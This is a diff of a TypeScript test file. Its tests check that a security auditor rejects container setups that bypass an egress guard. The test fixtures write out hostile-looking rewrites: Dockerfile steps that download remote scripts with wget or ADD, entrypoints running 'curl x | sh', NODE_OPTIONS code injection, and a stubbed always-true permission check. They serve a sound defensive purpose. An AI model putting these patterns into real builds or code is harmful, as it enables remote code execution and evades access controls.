@@ -48,30 +48,54 @@ describe('a direct Container is admitted only with all three proofs', () => {
     expect(auditForwarder({ ...live(), boundImage: `${IMAGE.repository}@sha256:${'0'.repeat(64)}` }).join('\n')).toContain('is bound to');
   });
 
-  test('(b) a build step, an untracked copy, an unpinned base or a foreign CMD keeps it in the set', () => {
+  test('(b) anything but FROM, COPY, WORKDIR, ENV, EXPOSE, USER, LABEL and CMD, or a foreign program, keeps it in the set', () => {
     const cases: ReadonlyArray<readonly [string, (text: string) => string]> = [
-      ['runs `RUN`', (text) => text.replace('USER node', 'RUN wget https://example.com/agent.js\nUSER node')],
-      ['not a tracked file', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs agent.js .')],
+      ['uses `RUN`', (text) => text.replace('USER node', 'RUN wget https://example.com/agent.js\nUSER node')],
+      ['uses `ENTRYPOINT`', (text) => text.replace(/^CMD /mu, 'ENTRYPOINT ["sh", "-c", "$CODE"]\nCMD ')],
+      ['uses `ONBUILD`', (text) => text.replace('USER node', 'ONBUILD RUN wget https://example.com/agent.js\nUSER node')],
+      ['uses `ADD`', (text) => text.replace('COPY server.mjs .', 'ADD https://example.com/agent.js .\nCOPY server.mjs .')],
+      ['uses `RUN`', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs \\\n  .\nLABEL a=b \\\nRUN=1\nRUN \\\n  wget https://example.com/x')],
+      ['not a tracked file', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs \\\n  agent.js .')],
       ['not a pinned digest', (text) => text.replace(/^FROM .*$/mu, 'FROM node:22-alpine')],
       ['not one tracked script', (text) => text.replace(/^CMD .*$/mu, 'CMD ["node", "-e", "require(process.env.CODE)"]')],
+      ['sets a NODE_ variable', (text) => text.replace('USER node', 'ENV NODE_OPTIONS=--import=data:text/javascript,x\nUSER node')],
+      ['names CMD twice', (text) => `${text}CMD ["node", "server.mjs"]\n`],
     ];
 
     for (const [reason, rewrite] of cases) {
-      expect({ reason, reasons: auditForwarder(withFile(DOCKERFILE, rewrite)).join('\n').includes(reason) }).toEqual({ reason, reasons: true });
+      const rewritten = withFile(DOCKERFILE, rewrite);
+
+      expect({ reason, changed: rewritten.sourceFiles.get(DOCKERFILE) !== live().sourceFiles.get(DOCKERFILE) }).toEqual({ reason, changed: true });
+      expect({ reason, found: auditForwarder(rewritten).join('\n').includes(reason) }).toEqual({ reason, found: true });
     }
   });
 
-  test('(c) an exec, a fetch before the check, or a check of a local predicate keeps it in the set', () => {
+  test('(c) any way to the container but a guarded containerFetch keeps it in the set', () => {
     const text = live().fileText;
+    const guard = 'if (!codexEgressAllowed({ method: request.method, url: request.url })) {';
+    const cancel = '  cancel(callId: string): void {';
+    const member = (added: string): string => text.replace(cancel, `${added}\n\n${cancel}`);
 
     const cases: ReadonlyArray<readonly [string, string]> = [
-      ['uses `exec`', text.replace('  cancel(callId: string): void {', '  async run(command: string) { return this.exec(command); }\n\n  cancel(callId: string): void {')],
-      ['no refusing check', text.replace("if (!codexEgressAllowed({ method: request.method, url: request.url })) {", 'if (!request.url) {')],
-      ['no refusing check', text.replace("import { codexEgressAllowed, EgressCalls } from '@kinu.run/core';", "import { EgressCalls } from '@kinu.run/core';\nconst codexEgressAllowed = (_: unknown): boolean => true;")],
+      ['touches `this.exec`', member('  async run(command: string) { return this.exec(command); }')],
+      ['touches `this.start`', member("  async boot() { await this.start({ entrypoint: ['sh', '-c', 'curl x | sh'] }); }")],
+      ['declares `entrypoint`', text.replace('  sleepAfter = ', "  entrypoint = ['sh', '-c', 'curl x | sh'];\n\n  sleepAfter = ")],
+      ['declares `envVars`', text.replace('  sleepAfter = ', "  envVars = { NODE_OPTIONS: '--import=x' };\n\n  sleepAfter = ")],
+      ['overrides `start`', member('  override async start() { return super.start(); }')],
+      ['touches `this.fetch`', member('  async pass(request: Request) { return this.fetch(request); }')],
+      ['reads a computed member', member("  async pass(request: Request) { return this['containerFetch'](request); }")],
+      ['other than by calling it directly', member('  async pass(request: Request) { const send = this.containerFetch.bind(this); return send(request); }')],
+      ['lets `this` escape', text.replace('export class CodexEgress', 'function drive(box: CodexEgress) { return box; }\n\nexport class CodexEgress').replace(cancel, `  leak() { return drive(this); }\n\n${cancel}`)],
+      ['no top-level', text.replace(guard, "const check = () => { if (!codexEgressAllowed({ method: request.method, url: request.url })) throw new KinuError('denied', 'x'); };\n    if (false) {")],
+      ['no top-level', text.replace(guard, "if (!codexEgressAllowed({ method: 'GET', url: 'https://chatgpt.com/backend-api/codex/models' })) {")],
+      ['no top-level', text.replace('        method: request.method,', '        method: other.method,').replace('async forward(ownerUserId: string, callId: string, request: Request)', 'async forward(ownerUserId: string, callId: string, request: Request, other: Request)')],
+      ['no top-level', text.replace(guard, 'if (!request.url) {')],
+      ['no top-level', text.replace("import { codexEgressAllowed, EgressCalls } from '@kinu.run/core';", "import { EgressCalls } from '@kinu.run/core';\nconst codexEgressAllowed = (_: unknown): boolean => true;")],
+      ['non-arrow function', member('  async pass(request: Request) { const self = this; return (function () { return self; })(); }')],
     ];
 
     for (const [reason, fileText] of cases) {
-      expect(fileText).not.toBe(text);
+      expect({ reason, changed: fileText !== text }).toEqual({ reason, changed: true });
       expect({ reason, found: auditForwarder({ ...live(), fileText }).join('\n').includes(reason) }).toEqual({ reason, found: true });
     }
   });
